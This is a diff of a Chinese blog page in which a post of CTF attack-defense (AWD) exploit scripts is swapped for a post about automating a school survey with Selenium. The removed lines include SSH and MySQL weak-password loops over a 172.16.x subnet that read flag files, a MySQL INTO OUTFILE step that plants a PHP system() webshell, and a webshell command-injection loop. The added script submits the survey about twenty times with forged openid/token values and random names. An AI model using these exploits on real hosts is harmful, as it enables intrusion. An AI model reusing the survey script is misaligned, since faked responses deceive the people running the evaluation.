@@ -4,25 +4,27 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>AWD攻击脚本(持续更新) | GetFlag&#39;s Blog</title>
+    <title>python+selenium实现自动化会长测评 | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
-<meta name="keywords" content="AWD,python,攻击脚本">
+    <meta name="description" content="首先吐槽下学校，在学校带个信息安全社团，社团联合会那边经常很多形式主义的活动，没有实际意义，但是还得必须做，其中尤其这个会长测评，很是麻烦，于是写了个自动化工具，就是效率低点，不过挺实用的功能已经实现了，先贴代码，详细的日后再写">
+<meta name="keywords" content="python,selenium,自动化">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AWD攻击脚本(持续更新)">
-<meta property="og:url" content="http://flag0.com/2018/02/18/AWD攻击脚本/index.html">
+<meta property="og:title" content="python+selenium实现自动化会长测评">
+<meta property="og:url" content="http://flag0.com/2018/03/26/python自动化测试会长测评/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
+<meta property="og:description" content="首先吐槽下学校，在学校带个信息安全社团，社团联合会那边经常很多形式主义的活动，没有实际意义，但是还得必须做，其中尤其这个会长测评，很是麻烦，于是写了个自动化工具，就是效率低点，不过挺实用的功能已经实现了，先贴代码，详细的日后再写">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-17T14:31:08.189Z">
+<meta property="og:image" content="http://flag0.com/img/images/python自动化会长测评/001.gif">
+<meta property="og:updated_time" content="2018-04-09T11:57:20.276Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="AWD攻击脚本(持续更新)">
-<meta name="twitter:description" content="一些很简单漏洞的利用脚本，慢慢积累，持久更新">
+<meta name="twitter:title" content="python+selenium实现自动化会长测评">
+<meta name="twitter:description" content="首先吐槽下学校，在学校带个信息安全社团，社团联合会那边经常很多形式主义的活动，没有实际意义，但是还得必须做，其中尤其这个会长测评，很是麻烦，于是写了个自动化工具，就是效率低点，不过挺实用的功能已经实现了，先贴代码，详细的日后再写">
+<meta name="twitter:image" content="http://flag0.com/img/images/python自动化会长测评/001.gif">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -78,14 +80,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/18/AWD攻击脚本/" title="AWD攻击脚本(持续更新)" itemprop="url">AWD攻击脚本(持续更新)</a>
+      <a href="/2018/03/26/python自动化测试会长测评/" title="python+selenium实现自动化会长测评" itemprop="url">python+selenium实现自动化会长测评</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-18T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-02-18</time>
+    <time datetime="2018-03-26T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-03-26</time>
     
   </p>
 </header>
@@ -94,73 +96,95 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh弱口令"><span class="toc-number">1.</span> <span class="toc-text">ssh弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">2.</span> <span class="toc-text">mysql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell利用"><span class="toc-number">3.</span> <span class="toc-text">webshell利用</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#运行效果"><span class="toc-number">1.</span> <span class="toc-text">运行效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script-py"><span class="toc-number">2.</span> <span class="toc-text">script.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-py"><span class="toc-number">3.</span> <span class="toc-text">user.py</span></a></li></ol>
 		
 		</div>
 		
-		<p>一些很简单漏洞的利用脚本，慢慢积累，持久更新</p>
+		<p>首先吐槽下学校，在学校带个信息安全社团，社团联合会那边经常很多形式主义的活动，没有实际意义，但是还得必须做，其中尤其这个会长测评，很是麻烦，于是写了个自动化工具，就是效率低点，不过挺实用的<br>功能已经实现了，先贴代码，详细的日后再写</p>
 <a id="more"></a>
-<h2 id="ssh弱口令"><a href="#ssh弱口令" class="headerlink" title="ssh弱口令"></a>ssh弱口令</h2><pre><code>#coding=utf-8
-import paramiko
+<h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><img src="\img\images\python自动化会长测评\001.gif" alt="images"></p>
+<h2 id="script-py"><a href="#script-py" class="headerlink" title="script.py"></a>script.py</h2><pre><code># coding=utf-8
+from selenium import webdriver
+import random,time
+import user
 
-sshc = paramiko.SSHClient()
-sshc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+def request_url(url):
+    options = webdriver.ChromeOptions()
+    options.add_argument(&apos;User-Agent=&quot;Mozilla/5.0 (Linux; U; Android 2.3.6; zh-cn; GT-S5660 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MicroMessenger/4.5.255&quot;&apos;)
+    drive=webdriver.Chrome(chrome_options=options)
+    drive.get(url)
+    try:
+        post_from(drive)
+    except:
+        drive.close()
+        return &apos;a&apos;
 
-host = &quot;172.16.1.&quot;
+def post_from(drive):
+    name = user.name().decode(&apos;utf-8&apos;)
+    advise = user.advice().decode(&apos;utf-8&apos;)
+    drive.find_element_by_id(&apos;5ab113d992beb51853e24996&apos;).send_keys(name)
+    time.sleep(3)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498b&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498c&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    js = &quot;var q=document.documentElement.scrollTop=555&quot;
+    drive.execute_script(js)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498d&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498e&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    js = &quot;var q=document.documentElement.scrollTop=1055&quot;
+    drive.execute_script(js)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498e&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e2498f&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    js = &quot;var q=document.documentElement.scrollTop=1555&quot;
+    drive.execute_script(js)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e24990&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e24991&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    js = &quot;var q=document.documentElement.scrollTop=2000&quot;
+    drive.execute_script(js)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e24992&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e24993&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;question_5ab113d992beb51853e24994&apos;]/div[2]/ul/li[1]/div/span&quot;).click()
+    drive.find_element_by_id(&apos;5ab113da92beb51853e249c9&apos;).send_keys(advise)
+    drive.find_element_by_xpath(&quot;.//*[@id=&apos;next_button&apos;]&quot;).click()
+    time.sleep(3)
+    drive.close()
 
-for i in range(120,131):
-    tag = host+str(i)
-    print tag
-    try:
-        try:
-            sshc.connect(tag,22,&apos;root&apos;,&apos;123456&apos;,timeout=1)
-        except:
-            sshc.connect(tag,22,&apos;admin&apos;,&apos;123456&apos;,timeout=1)
-        print sshc.exec_command(&apos;cat /root/flaginfo*&apos;)[1].readlines()
-    except:
-        print &apos;time out&apos;
-</code></pre><h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>mysql读文件</p>
-<pre><code>#coding=utf-8
-import MySQLdb
-host = &apos;172.16.1.&apos;
-for i in range(129,131):
-    tag = host+str(i)
-    print tag+&quot;3306&quot;
-    try:
-        MySQLdb.connect(tag,3306,&apos;root&apos;,&apos;root&apos;,&apos;mysql&apos;,timeout=1)
-        cur = conn.cursor()
-        cur.execute(&quot;select load_file(&apos;/root/flag.txt&apos;)&quot;)
-        print cur.fetchone()
-        cur.close()
-    except:
-        print &apos;MYSQL connect out&apos;
-conn.commit()
-conn.close()
-</code></pre><p>mysql写入一句话木马</p>
-<pre><code>#coding=utf-8
-import MySQLdb
-host = &apos;172.16.1.&apos;
-try:
-    conn = MySQLdb.connect(host=host,port=3306,user=&apos;root&apos;,passwd=&apos;root&apos;,db=&apos;mysql&apos;,connect_timeout=1)
-    cur = conn.cursor()
-    cur.execute(&quot;&quot;&quot;create table sys(cmd text NOT NULL);&quot;&quot;&quot;)
-    cur.execute(&quot;&quot;&quot;insert into sys(cmd)values(&quot;&lt;?php system(&apos;cat /root/flaginfo*&apos;);?&gt;&quot;);&quot;&quot;&quot;)
-    cur.execute(&quot;&quot;&quot;select * from sys into outfile &quot;/val/www/html/sys.php&quot;;&quot;&quot;&quot;)
-    os.system(&quot;curl &quot;+tag+&quot;/sys.php&quot;)
-except:
-    print &apos;Mysql time out&apos;
-</code></pre><h2 id="webshell利用"><a href="#webshell利用" class="headerlink" title="webshell利用"></a>webshell利用</h2><pre><code>#!usr/bin/python
-import urllib,urllib2
-for i in range(1,10):
-    tag = &apos;http://172.16.&apos;+str(i)+&apos;.113/add_book.php&apos;
-    data = {&quot;password&quot;:&quot;system(&apos;cat /flag&apos;);&quot;}
-    print tag
-    try:
-        f = urllib2.urlopen(url=tag,data=urllib.urlencode(data),timeout=1)
-        flag = f.read()
-        print flag[0:40]
-    except:
-        print &apos;time out&apos;
+def randoms():
+    seq = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789&apos;
+    randomlist = []
+    randomlist.append(&apos;obncMj&apos;+&apos;&apos;.join(random.sample(seq,22)))
+    randomlist.append(&apos;4_&apos; + &apos;&apos;.join(random.sample(seq,107)))
+    return randomlist
+if __name__ == &quot;__main__&quot;:
+    i = 0
+    while(i&lt;20):
+        url = &apos;https://www.wenjuan.in/s/eqe6Bn/?openid=&apos;+randoms()[0]+&apos;&amp;token=&apos;+randoms()[1]+&apos;&amp;bookid=default&apos;
+        if not request_url(url):
+            i=i+1
+            print &apos;成功做完第%d份测评问卷&apos;%i
+        else:
+            continue
+    print &apos;结束&apos;
+</code></pre><h2 id="user-py"><a href="#user-py" class="headerlink" title="user.py"></a>user.py</h2><pre><code># coding=utf-8
+import random
+s = &quot;&quot;&quot;
+张三
+...
+&quot;&quot;&quot;
+text = &quot;&quot;&quot;
+评论1
+评论2
+评论3
+评论4
+&quot;&quot;&quot;
+def name():
+    name = s.split(&apos;\n&apos;)
+    number = int(random.uniform(0,len(name)))
+    return name[number]
+
+def advice():
+    name = text.split(&apos;\n&apos;)
+    number = int(random.uniform(0,len(name)))
+    return name[number]
 </code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
@@ -168,13 +192,13 @@ for i in range(1,10):
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/AWD/">AWD</a><a href="/tags/python/">python</a><a href="/tags/攻击脚本/">攻击脚本</a>
+  <span></span> <a href="/tags/python/">python</a><a href="/tags/selenium/">selenium</a><a href="/tags/自动化/">自动化</a>
   </div>
 
 </div>
@@ -183,7 +207,7 @@ for i in range(1,10):
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/02/18/AWD攻击脚本/" data-title="AWD攻击脚本(持续更新) | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2018/03/26/python自动化测试会长测评/" data-title="python+selenium实现自动化会长测评 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -197,13 +221,21 @@ for i in range(1,10):
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2018/02/27/docker环境使用笔记/" title="docker 环境使用笔记">
+ <a href="/2018/04/04/山东电子培训总结/" title="神码选拔赛培训总结">
   <strong>上一篇：</strong><br/>
   <span>
-  docker 环境使用笔记</span>
+  神码选拔赛培训总结</span>
 </a>
 </div>
 
+
+<div class="next">
+<a href="/2018/03/22/铁三真题-drupal-Writeup/"  title="企业赛真题-drupal渗透-Writeup">
+ <strong>下一篇：</strong><br/> 
+ <span>企业赛真题-drupal渗透-Writeup
+</span>
+</a>
+</div>
 
 </nav>
 
@@ -217,7 +249,7 @@ for i in range(1,10):
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh弱口令"><span class="toc-number">1.</span> <span class="toc-text">ssh弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">2.</span> <span class="toc-text">mysql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell利用"><span class="toc-number">3.</span> <span class="toc-text">webshell利用</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#运行效果"><span class="toc-number">1.</span> <span class="toc-text">运行效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script-py"><span class="toc-number">2.</span> <span class="toc-text">script.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-py"><span class="toc-number">3.</span> <span class="toc-text">user.py</span></a></li></ol>
  
   </div>
 
